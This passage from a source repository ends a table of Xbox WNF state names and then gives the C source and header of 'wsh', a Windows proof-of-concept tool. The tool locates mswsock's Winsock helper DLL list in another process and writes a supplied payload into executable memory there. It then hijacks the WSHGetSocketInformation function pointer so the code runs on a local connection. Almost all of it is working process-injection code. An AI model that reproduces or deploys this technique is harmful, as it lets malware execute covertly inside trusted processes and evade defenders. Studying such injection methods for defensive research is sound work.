	{L"WNF_XBOX_QUERY_UPDATE_NOTIFICATION", 0x19890c35a3bd8075}, 
	{L"WNF_XBOX_REMOTE_SIGNOUT", 0x19890c35a3bde875}, 
	{L"WNF_XBOX_REPOSITORY_CHANGED", 0x19890c35a3bd8875}, 
	{L"WNF_XBOX_RESET_IDLE_TIMER", 0x19890c35a3be1075}, 
	{L"WNF_XBOX_SAFEAREA_SETTING_CHANGED", 0x19890c35a3be5075}, 
	{L"WNF_XBOX_SEND_LTV_COMMAND_REQUESTED", 0x19890c35a3bdb875}, 
	{L"WNF_XBOX_SETTINGS_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bef875}, 
	{L"WNF_XBOX_SHELL_DATACACHE_ENTITY_CHANGED", 0x19890c35a3bdc075}, 
	{L"WNF_XBOX_SHELL_INITIALIZED", 0x19890c35a3bd0875}, 
	{L"WNF_XBOX_SHELL_TOAST_NOTIFICATION", 0x19890c35a3bc2875}, 
	{L"WNF_XBOX_SIP_FOCUS_TRANSFER_NOTIFICATION", 0x19890c35a3bd3875}, 
	{L"WNF_XBOX_SIP_VISIBILITY_CHANGED", 0x19890c35a3bd2875}, 
	{L"WNF_XBOX_SPEECH_INPUT_DEVICE", 0x19890c35a3be7875}, 
	{L"WNF_XBOX_STORAGE_CHANGED", 0x19890c35a3bd6875}, 
	{L"WNF_XBOX_STORAGE_ERROR", 0x19890c35a3bc6875}, 
	{L"WNF_XBOX_STORAGE_STATUS", 0x19890c35a3bd6075}, 
	{L"WNF_XBOX_STREAMING_QUEUE_CHANGED", 0x19890c35a3bd7875}, 
	{L"WNF_XBOX_SUSPEND_SKELETAL_TRACKING_INITIALIZATION", 0x19890c35a3bf4075}, 
	{L"WNF_XBOX_SYSTEMUI_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bee075}, 
	{L"WNF_XBOX_SYSTEM_CONSTRAINED_MODE_STATUS_CHANGED", 0x19890c35a3bca075}, 
	{L"WNF_XBOX_SYSTEM_GAME_STREAMING_STATE_CHANGED", 0x19890c35a3bd3075}, 
	{L"WNF_XBOX_SYSTEM_IDLE_TIMEOUT_CHANGED", 0x19890c35a3bc9875}, 
	{L"WNF_XBOX_SYSTEM_LOW_POWER_MAINTENANCE_WORK_ALLOWED", 0x19890c35a3bd5075}, 
	{L"WNF_XBOX_SYSTEM_TITLE_AUTH_STATUS_CHANGED", 0x19890c35a3bc7875}, 
	{L"WNF_XBOX_SYSTEM_USER_CONTEXT_CHANGED", 0x19890c35a3bce075}, 
	{L"WNF_XBOX_TEST_NETWORK_CONNECTION_COMPLETE", 0x19890c35a3bf7875}, 
	{L"WNF_XBOX_TITLE_SPOP_VETO_RECEIVED", 0x19890c35a3beb075}, 
	{L"WNF_XBOX_VIDEOPLAYER_ACTIVEPLAYER", 0x19890c35a3be3875}, 
	{L"WNF_XBOX_VIDEOPLAYER_PLAYBACKPROGRESS", 0x19890c35a3be4875}, 
	{L"WNF_XBOX_VIDEOPLAYER_PLAYERSTATE", 0x19890c35a3be4075}, 
	{L"WNF_XBOX_WPN_PLATFORM_HOST_INITIALIZED", 0x19890c35a3bda075}, 
	{L"WNF_XBOX_XAM_SMB_SHARES_INIT_ALLOW_SYSTEM_READY", 0x19890c35a3bd4075}, 
	{L"WNF_XBOX_XBBLACKBOX_SNAP_NOTIFICATION", 0x19890c35a3bd4875},
  {0, 0},
};


```

`wsh/wsh.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <versionhelpers.h>

#include "../ntlib/util.h"
#include "wsh.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")

typedef struct _SOCK_HELPER_DLL_T {
    PWCHAR file;
    PWCHAR guid;
    PWCHAR description;
} SOCK_HELPER_DLL, *PSOCK_HELPER_DLL;

// there are many sock helper DLLs, but these are all that were 
// found in the registry for an evaluation copy of Windows 10
SOCK_HELPER_DLL helperList[]={
  { L"wshunix.dll",   L"{A00943D9-9C2E-4633-9B59-0057A3160994}", L"UNIX socket address family"},
  { L"wshtcpip.dll",  L"{E70F1AA0-AB8B-11CF-8CA3-00805F48A192}", L"Winsock2 Helper DLL (TL/IPv4)"},
  { L"wship6.dll",    L"{F9EAB0C0-26D4-11D0-BBBF-00AA006C34E4}", L"Winsock2 Helper DLL (TL/IPv6)"},
  { L"wshqos.dll",    L"{9D60A9E0-337A-11D0-BD88-0000C082E69A}", L"QoS Winsock2 Helper DLL"},
  { L"wshhyperv.dll", L"{1234191B-4BF7-4CA7-86E0-DFD7C32B5445}", L"Hyper-V Winsock2 Helper DLL"},
  { L"wshirda.dll",   L"{3972523D-2AF1-11D1-B655-00805F3642CC}", L"IrDA Winsock Helper DLL"},
  { NULL, NULL, NULL}
};

typedef struct _PROCENTRY_T {
    DWORD      id;                // unique id
    WCHAR      name[MAX_PATH];    // name of process
    LPVOID     mswsock;           // base address of wswsock.dll
    DWORD      cnt;               // count of ports listening
    WORD       ports[65535];      // listening port
    DWORD      addrs[65535];      // local address for each port
} PROCENTRY, *PPROCENTRY;

typedef struct _WSHINFO_T {
    DWORD      rva;               // relative virtual address of SockHelperDllListHead
    DWORD      cnt;               // number of PROCENTRY
    DWORD      plen;              // cnt * sizeof(PROCENTRY)
    PPROCENTRY plist;             // array of PROCENTRY structures
} WSHINFO, *PWSHINFO;
  
// Relative Virtual Address to Virtual Address
#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// calculate the RVA of Socket Helpder DLL LIST_ENTRY in MSWSOCK data section
DWORD GetSockHelperDllListHeadRVA(VOID) {
    WSADATA                  wsa;
    SOCKET                   s;
    LPVOID                   m;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    res, cnt, rva=0, i;
    PULONG_PTR               ds;
    MEMORY_BASIC_INFORMATION mbi;
    PWINSOCK_HELPER_DLL_INFO hdi;
    PLIST_ENTRY              list;
    
    // by creating a socket for AF_INET, 
    // this loads mswsock.dll and initializes SockHelperDllListHead
    WSAStartup(MAKEWORD(2, 0), &wsa);
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    closesocket(s);
    
    m = GetModuleHandle(L"mswsock.dll");
    
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
            
    // get the .data segment
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(DWORD*)sh[i].Name == *(DWORD*)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = (sh[i].Misc.VirtualSize/sizeof(ULONG_PTR));
        break;
      }
    }

    // for each pointer
    for(i=0; i<cnt; i++) {
      list = (PLIST_ENTRY)&ds[i];
      // skip it not equal
      if(list->Flink != list->Blink) continue;
      // skip if not heap
      if(!IsHeapPtr(list->Flink) && !IsHeapPtr(list->Blink)) continue;
      // assume it's a winsock helpder dll info structure
      hdi = (PWINSOCK_HELPER_DLL_INFO)list->Flink;
      
      // if heap/code pointers are present
      if(IsHeapPtr(hdi->Mapping)        &&
         IsCodePtr(hdi->WSHOpenSocket)  && 
         IsCodePtr(hdi->WSHOpenSocket2) &&
         IsCodePtr(hdi->WSHIoctl)) 
      {
         // return the RVA
         rva = (DWORD)((PBYTE)&ds[i] - (PBYTE)m);
         break;
      }
    }
    return rva;
}

// add process, local port and address to existing entry or create new one
BOOL AddProcessToList(WSHINFO *wsh, DWORD id, DWORD addr, DWORD port) {
    PPROCENTRY pe = NULL;
    DWORD      i;
    
    // first call? create list and set RVA
    if(wsh->plist == NULL) {
      wsh->cnt   = 0;        // number of process entries
      wsh->plen  = sizeof(PROCENTRY);
      wsh->plist = malloc(sizeof(PROCENTRY));

      if(wsh->plist == NULL) return FALSE;
      // zero initialize entry
      memset(wsh->plist, 0, sizeof(PROCENTRY));
      // read the RVA for SockHelperDllListHead
      wsh->rva = GetSockHelperDllListHeadRVA();
    }
    // search list for existing entry
    for(i=0; i<wsh->cnt; i++) {
      // found match?
      if(wsh->plist[i].id == id) {
        pe = &wsh->plist[i];
        break;
      }
    }
    // if found, add port + addr
    if(pe != NULL) {
      pe->ports[pe->cnt] = port;
      pe->addrs[pe->cnt] = addr;
      pe->cnt++;
      
      return TRUE;
    }
    pe = &wsh->plist[wsh->cnt];
    // set pid, process name and base of mswsock.dll
    pe->id  = id;
    pe->cnt = 1;
    pe->ports[0] = port;
    pe->addrs[0] = addr;
    pe->mswsock = GetRemoteModuleHandle(id, L"mswsock.dll");
    lstrcpy(pe->name, pid2name(id));
    // create new entry
    wsh->plen += sizeof(PROCENTRY);
    wsh->plist = realloc(wsh->plist, wsh->plen);
    wsh->cnt++;
    
    return TRUE;
}

DWORD GetProcessList(PWSHINFO wsh, BOOL bOpen) {
    DWORD                   plen;
    PPROCENTRY              plist;
    HANDLE                  hp;
    PMIB_TCPTABLE_OWNER_PID tbl;
    DWORD                   err, len, i;
    
    // obtain a list of listening ports and their process ids
    tbl = NULL;
    len = 0;
    // read the size of table
    err = GetExtendedTcpTable(tbl, &len, 
        TRUE, AF_INET, TCP_TABLE_OWNER_PID_LISTENER, 0);
        
    if(err != ERROR_INSUFFICIENT_BUFFER) return 0;
    
    // allocate sufficient buffer
    tbl = (PMIB_TCPTABLE_OWNER_PID)malloc(len);
    if(tbl != NULL) {
      // read the table
      err = GetExtendedTcpTable(tbl, &len, 
        TRUE, AF_INET, TCP_TABLE_OWNER_PID_LISTENER, 0);
    }
    
    if(err == NO_ERROR) {
      // for each entry
      for(i=0; i<tbl->dwNumEntries; i++) {
        if(tbl->table[i].dwLocalAddr == INADDR_ANY) {
          // try open process for reading+writing VM
          if(bOpen) {
            hp = OpenProcess(PROCESS_ALL_ACCESS, 
              FALSE, tbl->table[i].dwOwningPid);
            CloseHandle(hp);
            if(hp == NULL) continue;
          }
          // add this process or port to list
          AddProcessToList(
            wsh, 
            tbl->table[i].dwOwningPid, 
            tbl->table[i].dwLocalAddr, 
            tbl->table[i].dwLocalPort);
        }
      }
    }
    return wsh->cnt;
}

PWCHAR guid2name(PWCHAR guid) {
    DWORD i;
    PWCHAR str = L"Unknown";
    
    for(i=0; helperList[i].file != NULL; i++) {
      if(lstrcmpi(helperList[i].guid, guid) == 0) {
        str = helperList[i].description;
        break;
      }
    }
    return str;
}
          
// list WINSOCK_HELPER_DLL_INFO for pid
VOID ListWSHX(DWORD pid) {
    HANDLE                  hp;
    LPVOID                  mswsock, ptr;
    DWORD                   rva, i;
    SIZE_T                  rd;
    BOOL                    bRead;
    LIST_ENTRY              le;
    WINSOCK_HELPER_DLL_INFO hdi;
    OLECHAR                 guid[MAX_PATH];
    
    // get base address of mswsock.dll in remote process
    mswsock = GetRemoteModuleHandle(pid, L"mswsock.dll");
    
    if(mswsock == NULL) {
      printf("Windows Service Provider not found for process : %i.\n", pid);
      return;
    }
    
    // get the rva of SockHelperDllListHead
    rva = GetSockHelperDllListHeadRVA();

    if(rva == 0) {
      printf("Unable to obtain RVA for SockHelperDllListHead.\n");
      return;
    }
    
    printf("\n\nSockHelperDllListHead   : %p", (LPBYTE)mswsock + rva);

    // try to open the remote process
    hp = OpenProcess(
      PROCESS_ALL_ACCESS, FALSE, pid);
    
    if(hp == NULL) {
      printf("Unable to open process : %i\n", pid);
      return;
    }
    
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    SymInitialize(hp, NULL, TRUE);
    
    // read SockHelperDllListHead
    ReadProcessMemory(
      hp, (LPBYTE)mswsock + rva, 
      &le, sizeof(LIST_ENTRY), &rd);
      
    ptr = le.Flink;
    
    // for each WINSOCK_HELPER_DLL_INFO
    for(;;) {
      // read entry
      bRead = ReadProcessMemory(
        hp, (LPVOID)ptr, &hdi, 
        sizeof(WINSOCK_HELPER_DLL_INFO), &rd);
      
      // if not read, break
      if(!bRead || rd != sizeof(WINSOCK_HELPER_DLL_INFO)) break;
      
      // show information
      printf("\n\n");
      printf("Unknown                 : %i\n",   hdi.Unknown);
      printf("DllHandle               : %p : %ws\n", 
        (LPVOID)hdi.DllHandle, addr2sym(hp, hdi.DllHandle));
      
      printf("MinSockaddrLength       : %i\n",   hdi.MinSockaddrLength);
      printf("MaxSockaddrLength       : %i\n",   hdi.MaxSockaddrLength);
      printf("MinTdiAddressLength     : %i\n",   hdi.MinTdiAddressLength);
      printf("MaxTdiAddressLength     : %i\n",   hdi.MaxTdiAddressLength);
      printf("UseDelayedAcceptance    : %lX\n",  hdi.UseDelayedAcceptance);
      printf("Mapping                 : %p\n",   (LPVOID)hdi.Mapping);
      
      if(StringFromGUID2(&hdi.ProviderGUID, guid, MAX_PATH)) {
        printf("ProviderGUID            : %ws : (%ws)\n", guid, guid2name(guid));
      }
      
      printf("WSHOpenSocket           : %p : %ws\n",   
        hdi.WSHOpenSocket,  addr2sym(hp, hdi.WSHOpenSocket));
      
      printf("WSHOpenSocket2          : %p : %ws\n",   
        hdi.WSHOpenSocket2, addr2sym(hp, hdi.WSHOpenSocket2));
      
      printf("WSHJoinLeaf             : %p : %ws\n",   
        hdi.WSHJoinLeaf, addr2sym(hp, hdi.WSHJoinLeaf));
        
      printf("WSHNotify               : %p : %ws\n",   
        hdi.WSHNotify, addr2sym(hp, hdi.WSHNotify));
        
      printf("WSHGetSocketInformation : %p : %ws\n",   
        hdi.WSHGetSocketInformation, addr2sym(hp, hdi.WSHGetSocketInformation));
        
      printf("WSHSetSocketInformation : %p : %ws\n",   
        hdi.WSHSetSocketInformation, addr2sym(hp, hdi.WSHSetSocketInformation));
        
      printf("WSHGetSockaddrType      : %p : %ws\n",   
        hdi.WSHGetSockaddrType, addr2sym(hp, hdi.WSHGetSockaddrType));
        
      printf("WSHGetWildcardSockaddr  : %p : %ws\n",   
        hdi.WSHGetWildcardSockaddr, addr2sym(hp, hdi.WSHGetWildcardSockaddr));
        
      printf("WSHGetBroadcastSockaddr : %p : %ws\n",   
        hdi.WSHGetBroadcastSockaddr, addr2sym(hp, hdi.WSHGetBroadcastSockaddr));
        
      printf("WSHAddressToString      : %p : %ws\n",   
        hdi.WSHAddressToString, addr2sym(hp, hdi.WSHAddressToString));
        
      printf("WSHStringToAddress      : %p : %ws\n",   
        hdi.WSHStringToAddress, addr2sym(hp, hdi.WSHStringToAddress));
        
      printf("WSHIoctl                : %p : %ws\n",   
        hdi.WSHIoctl, addr2sym(hp,hdi.WSHIoctl));
    
      // finished? break
      ptr = hdi.HelperDllListEntry.Flink;
      if(ptr == (LPBYTE)mswsock + rva) break;
    }
    SymCleanup(hp);
    CloseHandle(hp);
}

// list transports and their provider GUID, DLL path
VOID ListTransports(VOID) {
    HKEY    hk;
    LSTATUS ls;
    WCHAR   *p, tp[MAX_PATH], rk[MAX_PATH], dll[MAX_PATH], path[MAX_PATH];
    DWORD   tplen, len, type;
    GUID    prov;
    OLECHAR guid[MAX_PATH];
    
    ZeroMemory(tp, ARRAYSIZE(tp));
    
    // open key to read transports available
    ls = RegOpenKeyEx(
      HKEY_LOCAL_MACHINE, 
      L"SYSTEM\\CurrentControlSet\\Services\\Winsock\\Parameters",
      0, KEY_READ, &hk);
      
    if(ls == ERROR_SUCCESS) {
      // read the value of Transports subkey
      tplen = MAX_PATH;
      ls = RegQueryValueEx(hk, L"Transports", NULL, NULL, (LPBYTE)tp, &tplen);
      
      RegCloseKey(hk);
    }
    
    // if we were able to read something
    if(tp[0] != 0) {
      for(p=tp;;) {
        printf("\n");
        // get the length of transport name
        tplen = lstrlen(p);
        // end of list? break
        if(tplen == 0) break;
        // format root key
        wsprintf(rk, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters\\Winsock", p);
        p += tplen + 1;
        // try open it
        ls = RegOpenKeyEx(
          HKEY_LOCAL_MACHINE,
          rk, 0, KEY_READ, &hk);
          
        if(ls == ERROR_SUCCESS) {
          // read the HelperDllName
          len = MAX_PATH;
          ls = RegQueryValueEx(hk, L"HelperDllName", NULL, NULL, (LPBYTE)dll, &len);
          
          if(ls == ERROR_SUCCESS) {
            if(ExpandEnvironmentStrings(dll, path, MAX_PATH) != 0) {
              printf("HelperDllName : %ws\n", path);
              
              // read the ProviderGUID
              len = sizeof(GUID);
              ls = RegQueryValueEx(hk, L"ProviderGUID", NULL, NULL, (LPBYTE)&prov, &len);
              if(ls == ERROR_SUCCESS) {
                if(StringFromGUID2(&prov, guid, MAX_PATH)) {
                  printf("ProviderGUID  : %ws\n", guid);
                }
              }
            }
          }
          RegCloseKey(hk);
        }
      }
    }
}

// list WINSOCK_HELPER_DLL_INFO for pid
LPVOID GetHelperDLLInfo(HANDLE hp, DWORD pid, PWINSOCK_HELPER_DLL_INFO hdi) {
    LPVOID     mswsock, ptr, addr = NULL;
    DWORD      rva, i;
    SIZE_T     rd;
    BOOL       bRead;
    LIST_ENTRY le;
    GUID       guid;
    
    // convert the TCP/IPv4 provider GUID to binary
    CLSIDFromString(L"{E70F1AA0-AB8B-11CF-8CA3-00805F48A192}", &guid);
    
    // get base address of mswsock.dll in remote process
    mswsock = GetRemoteModuleHandle(pid, L"mswsock.dll");
    
    if(mswsock == NULL) return NULL;
    
    // get the rva of SockHelperDllListHead
    rva = GetSockHelperDllListHeadRVA();
    
    if(rva == 0) return NULL;
    
    // read SockHelperDllListHead
    ReadProcessMemory(
      hp, (LPBYTE)mswsock + rva, 
      &le, sizeof(LIST_ENTRY), &rd);
      
    ptr = le.Flink;
    
    // for each WINSOCK_HELPER_DLL_INFO
    for(;;) {
      // read entry
      bRead = ReadProcessMemory(
        hp, (LPVOID)ptr, hdi, 
        sizeof(WINSOCK_HELPER_DLL_INFO), &rd);
      
      // if not read, break
      if(!bRead || rd != sizeof(WINSOCK_HELPER_DLL_INFO)) break;
    
      // if this is the TCP/IPv4 provider, return TRUE
      if(memcmp(&hdi->ProviderGUID, &guid, sizeof(GUID)) == 0) {
        addr = ptr;
        break;
      }
      
      // finished? break
      ptr = hdi->HelperDllListEntry.Flink;
      if(ptr == (LPBYTE)mswsock + rva) break;
    }
    return addr;
}

VOID inject(DWORD pid, WORD port, LPVOID payload, DWORD payloadSize) {
    DWORD                   rva, r;
    HANDLE                  hp;
    WINSOCK_HELPER_DLL_INFO hdi;
    LPVOID                  cs, addr;
    SIZE_T                  wr;
    SOCKET                  s;
    struct sockaddr_in      sin;
    
    // 1. Try open process for reading/writing VM
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    if(hp == NULL) {
      printf("Unable to open PID : %i\n", pid);
      return;
    }
    
    // 2. Get helper DLL entry for TCP v4
    addr = GetHelperDLLInfo(hp, pid, &hdi);
    
    if(addr != NULL) {
      // 3. Create a windows socket and write the payload to remote process
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
      
      cs = VirtualAllocEx(hp, NULL, payloadSize,
          MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if(cs != NULL) {
        if(WriteProcessMemory(hp, cs, payload, payloadSize, &wr)) {
      
          // 4. Update the function pointer with pointer to payload
          if(WriteProcessMemory(
            hp, 
            (PBYTE)addr + offsetof(WINSOCK_HELPER_DLL_INFO, WSHGetSocketInformation),
            &cs,
            sizeof(ULONG_PTR), 
            &wr)) 
          {
            // 5. Trigger it with connection to the port on localhost
            sin.sin_family      = AF_INET;
            sin.sin_port        = htons(port);
            sin.sin_addr.s_addr = inet_addr("127.0.0.1");
            
            if(connect(s, (struct sockaddr*)&sin, sizeof(sin)) == 0) {
              printf("Injection completed.\n");              
              // wait a moment before restoring pointer
              Sleep(10);
            } else printf("Unable to connect to service.\n");
            
            // 6. Restore function pointer and clean up
            WriteProcessMemory(
              hp, 
              (PBYTE)addr + offsetof(WINSOCK_HELPER_DLL_INFO, WSHGetSocketInformation),
              &hdi.WSHGetSocketInformation,
              sizeof(ULONG_PTR), 
              &wr);
          } else printf("Unable to update function pointer.\n");
        } else printf("Unable to deploy payload.\n");
        VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
        closesocket(s);
      } else printf("Unable to allocate RWX memory.\n");        
    } else {
      printf("Unable to find WINSOCK_HELPER_DLL_INFO entry.\n");
    }
    CloseHandle(hp);
}

void usage(void) {
    wprintf(L"usage: wsh <process> <payload>\n");
    exit(0);
}

DWORD _RtlGetVersion(void) {
    NTSTATUS(WINAPI *RtlGetVersion)(LPOSVERSIONINFOEXW);
    OSVERSIONINFOEXW osvi;
    DWORD            ver = 0;

    *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandle(L"ntdll"), "RtlGetVersion");

    if (NULL != RtlGetVersion) {
      osvi.dwOSVersionInfoSize = sizeof(osvi);
      RtlGetVersion(&osvi);
      ver = osvi.dwMajorVersion;
    }
    return ver;
}

int main(void) {
    DWORD         i, j, len, cnt, pid = 0, port = 0;
    WSHINFO       wsh;
    LPVOID        payload;
    int           argc;
    wchar_t       **argv;
  
    if(_RtlGetVersion() != 10) {
      printf("\nWARNING: PoC only tested on Windows 10!\n");
    }
    
    memset(&wsh, 0, sizeof(wsh));
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      printf("WARNING: could not enable debugging privilege.\n");
    }
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
  
    // if no parameters, list all available processes
    if(argc == 1) {
      ListTransports();
      cnt = GetProcessList(&wsh, TRUE);
    
      printf("\n%-15s | %-4s | %s\n", "Process", "PID", "TCP Ports");
      printf("***************************************\n");
      
      for(i=0; i<cnt; i++) {
        printf("%-15ws : %5i : ", wsh.plist[i].name, wsh.plist[i].id);
        for(j=0; j<wsh.plist[i].cnt; j++) {
          printf("%i", htons(wsh.plist[i].ports[j]));
          if((j+1) != wsh.plist[i].cnt) putchar(',');
        }
        putchar('\n');
      }
    } else if(argc == 2 || argc == 4) {
      pid = name2pid(argv[1]);
      if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
      if(pid == 0) {
        printf("ERROR: unable to resolve pid for \"%ws\".\n", argv[1]);
        return -1;
      }
    
      // if just one parameter, list WSHX structures
      if(argc == 2) {
        ListWSHX(pid);
      } else {
      // if two parameters, attempt to perform injection
        len = readpic(argv[3], &payload);
        if(len == 0) {
          printf("Unable to read %ws.\n", argv[3]);
        } else {
          port = wcstoull(argv[2], NULL, 10);
          inject(pid, port, payload, len);
        }
      }
    } else {
      printf("\nusage: wsh <process> <port> <payload>\n");
    }
    return 0;
}

```

`wsh/wsh.h`:

```h

#ifndef _WSAHELP_H
#define _WSAHELP_H

#include <winsock2.h>
//#include <ntsecapi.h>
#ifdef __cplusplus
extern "C" {
#endif /* __cplusplus */

#define WSH_NOTIFY_BIND 0x00000001
#define WSH_NOTIFY_LISTEN 0x00000002
#define WSH_NOTIFY_CONNECT 0x00000004
#define WSH_NOTIFY_ACCEPT 0x00000008
#define WSH_NOTIFY_SHUTDOWN_RECEIVE 0x00000010
#define WSH_NOTIFY_SHUTDOWN_SEND 0x00000020
#define WSH_NOTIFY_SHUTDOWN_ALL 0x00000040
#define WSH_NOTIFY_CLOSE 0x00000080
#define WSH_NOTIFY_CONNECT_ERROR 0x00000100
#define SOL_INTERNAL 0xFFFE
#define SO_CONTEXT 1

typedef enum _SOCKADDR_ADDRESS_INFO {
    SockaddrAddressInfoNormal,
    SockaddrAddressInfoWildcard,
    SockaddrAddressInfoBroadcast,
    SockaddrAddressInfoLoopback
} SOCKADDR_ADDRESS_INFO, *PSOCKADDR_ADDRESS_INFO;

typedef enum _SOCKADDR_ENDPOINT_INFO {
    SockaddrEndpointInfoNormal,
    SockaddrEndpointInfoWildcard,
    SockaddrEndpointInfoReserved
} SOCKADDR_ENDPOINT_INFO, *PSOCKADDR_ENDPOINT_INFO;

typedef struct _WINSOCK_MAPPING {
    DWORD Rows;
    DWORD Columns;
    struct {
        DWORD AddressFamily;
        DWORD SocketType;
        DWORD Protocol;
    } Mapping[1];
} WINSOCK_MAPPING, *PWINSOCK_MAPPING;

typedef struct _SOCKADDR_INFO {
    SOCKADDR_ADDRESS_INFO AddressInfo;
    SOCKADDR_ENDPOINT_INFO EndpointInfo;
} SOCKADDR_INFO, *PSOCKADDR_INFO;

INT WINAPI WSHAddressToString(LPSOCKADDR, INT, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD);
INT WINAPI WSHEnumProtocols(LPINT, LPWSTR, LPVOID, LPDWORD);
INT WINAPI WSHGetBroadcastSockaddr(PVOID, PSOCKADDR, PINT);
INT WINAPI WSHGetProviderGuid(LPWSTR, LPGUID);
INT WINAPI WSHGetSockaddrType(PSOCKADDR, DWORD, PSOCKADDR_INFO);
INT WINAPI WSHGetSocketInformation(PVOID, SOCKET, HANDLE, HANDLE, INT, INT, PCHAR, LPINT);
INT WINAPI WSHGetWildcardSockaddr(PVOID, PSOCKADDR, PINT);
DWORD WINAPI WSHGetWinsockMapping(PWINSOCK_MAPPING, DWORD);
INT WINAPI WSHGetWSAProtocolInfo(LPWSTR, LPWSAPROTOCOL_INFOW*, LPDWORD);
INT WINAPI WSHIoctl(PVOID, SOCKET, HANDLE, HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD,
                    LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE, LPBOOL);
INT WINAPI WSHJoinLeaf(PVOID, SOCKET, HANDLE, HANDLE, PVOID, SOCKET, PSOCKADDR,
                       DWORD, LPWSABUF, LPWSABUF, LPQOS, LPQOS, DWORD);
INT WINAPI WSHNotify(PVOID, SOCKET, HANDLE, HANDLE, DWORD);
INT WINAPI WSHOpenSocket(PINT, PINT, PINT, PUNICODE_STRING, PVOID, PDWORD);
INT WINAPI WSHOpenSocket2(PINT, PINT, PINT, GROUP, DWORD, PUNICODE_STRING, PVOID*, PDWORD);
INT WINAPI WSHSetSocketInformation(PVOID, SOCKET, HANDLE, HANDLE, INT, INT, PCHAR, INT);
INT WINAPI WSHStringToAddress(LPWSTR, DWORD, LPWSAPROTOCOL_INFOW, LPSOCKADDR, LPDWORD);

typedef INT (WINAPI *PWSH_ADDRESS_TO_STRING)(LPSOCKADDR, INT, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD);
typedef INT (WINAPI *PWSH_ENUM_PROTOCOLS)(LPINT, LPWSTR, LPVOID, LPDWORD);
typedef INT (WINAPI *PWSH_GET_BROADCAST_SOCKADDR)(PVOID, PSOCKADDR, PINT);
typedef INT (WINAPI *PWSH_GET_PROVIDER_GUID)(LPWSTR, LPGUID);
typedef INT (WINAPI *PWSH_GET_SOCKADDR_TYPE)(PSOCKADDR, DWORD, PSOCKADDR_INFO);
typedef INT (WINAPI *PWSH_GET_SOCKET_INFORMATION)(PVOID, SOCKET, HANDLE, HANDLE, INT, INT, PCHAR, LPINT);
typedef INT (WINAPI *PWSH_GET_WILDCARD_SOCKADDR)(PVOID, PSOCKADDR, PINT);
typedef DWORD (WINAPI *PWSH_GET_WINSOCK_MAPPING)(PWINSOCK_MAPPING, DWORD);
typedef INT (WINAPI *PWSH_GET_WSAPROTOCOL_INFO)(LPWSTR, LPWSAPROTOCOL_INFOW*, LPDWORD);
typedef INT (WINAPI *PWSH_IOCTL)(PVOID, SOCKET, HANDLE, HANDLE, DWORD, LPVOID, DWORD,
                                 LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE, LPBOOL);
typedef INT (WINAPI *PWSH_JOIN_LEAF)(PVOID, SOCKET, HANDLE, HANDLE, PVOID, SOCKET,
                                     PSOCKADDR, DWORD, LPWSABUF, LPWSABUF, LPQOS, LPQOS, DWORD);
typedef INT (WINAPI *PWSH_NOTIFY)(PVOID, SOCKET, HANDLE, HANDLE, DWORD);
typedef INT (WINAPI *PWSH_OPEN_SOCKET)(PINT, PINT, PINT, PUNICODE_STRING, PVOID, PDWORD);
typedef INT (WINAPI *PWSH_OPEN_SOCKET2)(PINT, PINT, PINT, GROUP, DWORD, PUNICODE_STRING, PVOID*, PDWORD);
